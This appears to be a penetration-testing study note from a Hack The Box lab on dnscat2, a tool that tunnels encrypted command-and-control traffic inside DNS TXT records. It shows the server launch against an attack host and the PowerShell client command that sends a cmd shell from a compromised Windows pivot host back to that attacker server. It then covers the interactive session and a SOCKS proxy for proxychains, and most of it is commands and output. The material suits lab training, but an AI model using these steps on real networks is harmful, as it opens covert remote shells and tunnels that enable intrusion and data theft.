
---
### Dnscat2
It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
#### Installation
```bash
git clone https://github.com/iagox86/dnscat2.git
```
#### Starting the dnscat2 server
```bash
hcx05@htb[/htb]$ sudo ruby dnscat2.rb --dns host=[attack host ip],port=53,domain=inlanefreight.local --no-cache
#domain=inlanefreight.local: Pinpoint a domain that is controled by the attacker.
#--no-cache: Don't cache any DNS request, it set TTL to 0 and add a flag to constrain caching.

New window created: 0 
dnscat2> New window created: crypto-debug 
Welcome to dnscat2! Some documentation may be out of date. 

auto_attach => false 
history_size (for new windows) => 1000 
Security policy changed: All connections must be encrypted 
New window created: dns1 
Starting Dnscat2 DNS server on 10.10.14.18:53 
[domains = inlanefreight.local]... 

Assuming you have an authoritative DNS server, you can run the client anywhere with the following (--secret is optional): 

./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local 

To talk directly to the server without a domain name, run: ./dnscat --dns server=x.x.x.x,port=53 --secret=[secret key]

Of course, you have to figure out <server> yourself! Clients will connect directly on UDP port 53.
```
After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
#### Cloning dnscat2-powershell to the Attack Host
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
#### Importing dnscat2.ps1 to Pivot host
After copy `dnscat2.ps1` to Pivot host:
```powershell
PS C:\htb> Import-Module .\dnscat2.ps1
```
Establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
```powershell
PS C:\htb> Start-Dnscat2 -DNSserver [attack host ip] -Domain inlanefreight.local -PreSharedSecret [secret key] -Exec cmd
```
We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted.
#### Confirming Session Establishment
```shell
New window created: 1 
Session 1 Security: ENCRYPTED AND VERIFIED! 
(the security depends on the strength of your pre-shared secret!) 

dnscat2>
```
#### Interacting with the Established Session
```shell
dnscat2> window -i 1

<SNIP>

C:\Windows\system32>
```
#### SOCKS Proxy
Press `Ctrl + Z` back to `dnscat2`
```shell
dnscat2> socks 127.0.0.1:[port]
```
Then use `proxychains`















